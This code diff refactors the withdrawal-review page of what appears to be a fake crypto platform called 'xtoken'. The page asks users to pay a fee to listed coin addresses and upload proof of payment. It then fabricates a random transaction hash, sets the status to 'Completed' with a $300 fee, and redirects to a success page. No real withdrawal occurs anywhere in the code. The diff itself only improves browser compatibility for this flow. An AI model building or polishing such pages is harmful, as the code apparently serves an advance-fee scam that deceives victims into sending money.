@@ -97,12 +97,12 @@
       </button>
     </div>
     
-    <!-- File Upload -->
+    <!-- File Upload - Universal Browser Compatible -->
     <div class="upload-zone" id="upload-zone">
-      <input type="file" id="proof-file" class="upload-input" accept="image/*" required>
+      <input type="file" id="proof-file" accept="image/*" style="display: none;">
       <div class="upload-icon">📤</div>
       <div class="upload-text">Upload Transaction Proof</div>
-      <div class="upload-hint">Drag & drop or click to select<br>PNG, JPG up to 5MB</div>
+      <div class="upload-hint">Click to select photo<br>PNG, JPG up to 5MB</div>
     </div>
     
     <!-- Warning -->
@@ -114,7 +114,7 @@
       </div>
     </div>
     
-    <!-- Proceed Button - NOT a form submit, direct click handler -->
+    <!-- Proceed Button -->
     <button type="button" id="proceed-btn" class="btn btn-success w-full" disabled>
       <span>✓</span>
       <span>Proceed with Withdrawal</span>
@@ -126,75 +126,75 @@
   
   <script src="shared.js"></script>
   <script>
-    // Inline script for immediate execution and iPhone compatibility
+    // Universal Browser Compatible JavaScript
     (function() {
       // Get URL parameters
-      const urlParams = new URLSearchParams(window.location.search);
-      const amount = urlParams.get('amount') || '0';
-      const type = urlParams.get('type') || 'wallet';
-      const destination = urlParams.get('destination') || '';
-      const hasRefund = urlParams.get('refund') === '7PE9TA';
+      var urlParams = new URLSearchParams(window.location.search);
+      var amount = urlParams.get('amount') || '0';
+      var type = urlParams.get('type') || 'wallet';
+      var destination = urlParams.get('destination') || '';
+      var hasRefund = urlParams.get('refund') === '7PE9TA';
       
       // Get pending tx data from localStorage
-      let txData = {};
+      var txData = {};
       try {
-        const pending = localStorage.getItem('xtoken_pending_tx');
+        var pending = localStorage.getItem('xtoken_pending_tx');
         if (pending) {
           txData = JSON.parse(pending);
         }
       } catch(e) {}
       
       // Calculate amounts
-      const usdAmount = parseFloat(amount) || txData.amount || 0;
+      var usdAmount = parseFloat(amount) || txData.amount || 0;
       
       // Get current BNB price from localStorage
-      let bnbPrice = 680;
+      var bnbPrice = 680;
       try {
-        const state = localStorage.getItem('xtoken_state');
+        var state = localStorage.getItem('xtoken_state');
         if (state) {
           bnbPrice = JSON.parse(state).bnbPrice || 680;
         }
       } catch(e) {}
       
-      const bnbAmount = (usdAmount / bnbPrice).toFixed(8);
+      var bnbAmount = (usdAmount / bnbPrice).toFixed(8);
       
       // Update display immediately
-      document.querySelectorAll('[data-review-amount]').forEach(el => {
+      document.querySelectorAll('[data-review-amount]').forEach(function(el) {
         el.textContent = '$' + usdAmount.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
       });
       
-      document.querySelectorAll('[data-review-bnb]').forEach(el => {
+      document.querySelectorAll('[data-review-bnb]').forEach(function(el) {
         el.textContent = bnbAmount + ' BNB';
       });
       
-      const typeNames = {
+      var typeNames = {
         'cashapp': 'Cash App',
         'paypal': 'PayPal',
         'bank': 'Bank Transfer',
         'wallet': 'External Wallet'
       };
       
-      document.querySelectorAll('[data-review-type]').forEach(el => {
+      document.querySelectorAll('[data-review-type]').forEach(function(el) {
         el.textContent = typeNames[type] || type;
       });
       
       // Show refund code if used
       if (hasRefund) {
-        const reviewCard = document.getElementById('review-card');
-        const refundRow = document.createElement('div');
+        var reviewCard = document.getElementById('review-card');
+        var refundRow = document.createElement('div');
         refundRow.className = 'review-row';
         refundRow.innerHTML = '<span class="review-label">Refund Code</span><span class="review-value" style="color: #10b981;">7PE9TA ✓</span>';
         reviewCard.appendChild(refundRow);
       }
       
       // Coin selection
-      const coinSelect = document.getElementById('coin-select');
-      const addressBoxes = document.querySelectorAll('.address-box');
+      var coinSelect = document.getElementById('coin-select');
+      var addressBoxes = document.querySelectorAll('.address-box');
       
       if (coinSelect) {
         coinSelect.addEventListener('change', function(e) {
-          const coin = e.target.value;
-          addressBoxes.forEach(box => {
+          var coin = e.target.value;
+          addressBoxes.forEach(function(box) {
             box.classList.remove('active');
             if (box.dataset.coin === coin) {
               box.classList.add('active');
@@ -204,76 +204,85 @@
       }
       
       // Copy buttons
-      document.querySelectorAll('.copy-btn').forEach(btn => {
+      document.querySelectorAll('.copy-btn').forEach(function(btn) {
         btn.addEventListener('click', function() {
-          const text = this.dataset.copy;
+          var text = this.dataset.copy;
           if (navigator.clipboard) {
-            navigator.clipboard.writeText(text).then(() => {
-              this.classList.add('copied');
-              this.innerHTML = '✓ Copied';
-              setTimeout(() => {
-                this.classList.remove('copied');
-                this.innerHTML = '📋 Copy';
+            navigator.clipboard.writeText(text).then(function() {
+              btn.classList.add('copied');
+              btn.innerHTML = '✓ Copied';
+              setTimeout(function() {
+                btn.classList.remove('copied');
+                btn.innerHTML = '📋 Copy';
               }, 2000);
             });
           }
         });
       });
       
-      // File upload
-      const uploadZone = document.getElementById('upload-zone');
-      const fileInput = document.getElementById('proof-file');
-      const proceedBtn = document.getElementById('proceed-btn');
+      // FILE UPLOAD - Universal Browser Compatible
+      var uploadZone = document.getElementById('upload-zone');
+      var fileInput = document.getElementById('proof-file');
+      var proceedBtn = document.getElementById('proceed-btn');
       
       if (uploadZone && fileInput) {
-        uploadZone.addEventListener('click', function() {
+        // Click on upload zone triggers file input
+        uploadZone.addEventListener('click', function(e) {
           fileInput.click();
         });
         
-        uploadZone.addEventListener('dragover', function(e) {
-          e.preventDefault();
-          uploadZone.classList.add('dragover');
-        });
-        
-        uploadZone.addEventListener('dragleave', function() {
-          uploadZone.classList.remove('dragover');
-        });
-        
-        uploadZone.addEventListener('drop', function(e) {
-          e.preventDefault();
-          uploadZone.classList.remove('dragover');
-          if (e.dataTransfer.files[0]) {
-            handleFile(e.dataTransfer.files[0]);
-          }
-        });
-        
+        // File selected
         fileInput.addEventListener('change', function(e) {
-          if (e.target.files[0]) {
+          if (e.target.files && e.target.files[0]) {
             handleFile(e.target.files[0]);
           }
         });
       }
       
       function handleFile(file) {
-        if (!file.type.startsWith('image/')) return;
+        // Validate file
+        if (file.size > 5 * 1024 * 1024) {
+          alert('File too large. Please select an image under 5MB.');
+          return;
+        }
         
-        const reader = new FileReader();
+        if (!file.type.match('image.*')) {
+          alert('Please select an image file (PNG or JPG).');
+          return;
+        }
+        
+        // Read and display preview
+        var reader = new FileReader();
+        
         reader.onload = function(e) {
-          uploadZone.innerHTML = '<img src="' + e.target.result + '" class="upload-preview" alt="Preview"><p class="upload-text">✓ File uploaded</p><p class="upload-hint">' + file.name + '</p>';
+          uploadZone.innerHTML = '<img src="' + e.target.result + '" class="upload-preview" alt="Preview" style="max-width: 100%; max-height: 150px; border-radius: 8px;"><p class="upload-text">✓ File uploaded</p><p class="upload-hint">' + file.name + '</p>';
+          uploadZone.classList.add('has-file');
+          if (proceedBtn) {
+            proceedBtn.disabled = false;
+            proceedBtn.classList.add('btn-glow');
+          }
+          
+          // Save for success page
+          localStorage.setItem('xtoken_uploaded_file', e.target.result);
+        };
+        
+        reader.onerror = function() {
+          // Fallback if preview fails
+          uploadZone.innerHTML = '<div class="upload-icon">✓</div><p class="upload-text">File selected</p><p class="upload-hint">' + file.name + '</p>';
           uploadZone.classList.add('has-file');
           if (proceedBtn) {
             proceedBtn.disabled = false;
             proceedBtn.classList.add('btn-glow');
           }
         };
+        
         reader.readAsDataURL(file);
       }
       
-      // Proceed button - MULTIPLE REDIRECT METHODS FOR IPHONE SAFARI
+      // Proceed button - Universal redirect
       if (proceedBtn) {
         proceedBtn.addEventListener('click', function(e) {
           e.preventDefault();
-          e.stopPropagation();
           
           // Validate coin selected
           if (!coinSelect.value) {
@@ -282,13 +291,13 @@
           }
           
           // Calculate deduction
-          const withdrawAmount = parseFloat(amount) || 0;
-          const bnbAmount = withdrawAmount / bnbPrice;
+          var withdrawAmount = parseFloat(amount) || 0;
+          var bnbAmount = withdrawAmount / bnbPrice;
           
           // Get current state
-          let currentState = {};
+          var currentState = {};
           try {
-            const saved = localStorage.getItem('xtoken_state');
+            var saved = localStorage.getItem('xtoken_state');
             if (saved) currentState = JSON.parse(saved);
           } catch(e) {}
           
@@ -300,14 +309,14 @@
           localStorage.setItem('xtoken_state', JSON.stringify(currentState));
           
           // Save completed transaction
-          const completedTx = {
+          var completedTx = {
             amount: withdrawAmount,
             bnbAmount: bnbAmount.toFixed(8),
             type: type,
             destination: destination || txData.destination || 'Unknown',
             refundCode: hasRefund ? '7PE9TA' : '',
             date: new Date().toISOString(),
-            txId: '0x' + Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join(''),
+            txId: '0x' + Array(64).fill(0).map(function() { return Math.floor(Math.random() * 16).toString(16); }).join(''),
             fee: 300.00,
             status: 'Completed'
           };
@@ -315,39 +324,8 @@
           localStorage.setItem('xtoken_last_tx', JSON.stringify(completedTx));
           localStorage.removeItem('xtoken_pending_tx');
           
-          // MULTIPLE REDIRECT ATTEMPTS FOR IPHONE SAFARI COMPATIBILITY
-          
-          // Method 1: Standard redirect with delay
-          setTimeout(function() {
-            window.location.href = 'success.html';
-          }, 100);
-          
-          // Method 2: Replace (no history)
-          setTimeout(function() {
-            window.location.replace('success.html');
-          }, 200);
-          
-          // Method 3: Meta refresh fallback (in case JS blocked)
-          const meta = document.createElement('meta');
-          meta.httpEquiv = 'refresh';
-          meta.content = '0;url=success.html';
-          document.head.appendChild(meta);
-          
-          // Method 4: Anchor click fallback
-          setTimeout(function() {
-            const anchor = document.getElementById('redirect-anchor');
-            if (anchor) {
-              anchor.click();
-            }
-          }, 300);
-          
-          // Method 5: Direct assign
-          setTimeout(function() {
-            window.location.assign('success.html');
-          }, 400);
-          
-          // Prevent any further action
-          return false;
+          // Redirect to success page
+          window.location.href = 'success.html';
         });
       }
     })();
